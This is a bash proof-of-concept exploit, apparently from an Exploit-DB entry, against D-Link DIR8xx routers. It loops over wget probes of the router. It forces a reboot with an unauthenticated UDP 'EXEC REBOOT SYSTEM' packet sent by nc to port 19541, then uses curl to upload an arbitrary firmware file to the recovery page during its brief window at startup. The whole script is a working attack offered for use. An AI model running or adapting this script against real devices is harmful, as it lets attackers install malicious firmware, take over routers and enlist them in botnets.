#!/bin/bash

# If you have access to an ethernet port you can upload custom firmware to a device because system recovery service is started and available for a few seconds after restart.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/update.sh

FIRMWARE="firmware.bin"
IP="192.168.0.1"
while true; do
	T=$(($RANDOM + ($RANDOM % 2) * 32768))
	STATUS=`wget -t 1 --no-cache -T 0.2 -O - http://$IP/?_=$T 2>/dev/null`
	if [[ $STATUS == *"<title>Provided by D-Link</title>"* ]]; then
		echo "Uploading..."
		curl -F "data=@$FIRMWARE" --connect-timeout 99999 -m 99999 --output /dev/null http://$IP/f2.htm
		break
	elif [[ $STATUS == *"<title>D-LINK</title>"* ]]; then
		echo "Rebooting..."
		echo -n -e '\x00\x01\x00\x01EXEC REBOOT SYSTEMaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' | timeout 1s nc -u $IP 19541
	fi
done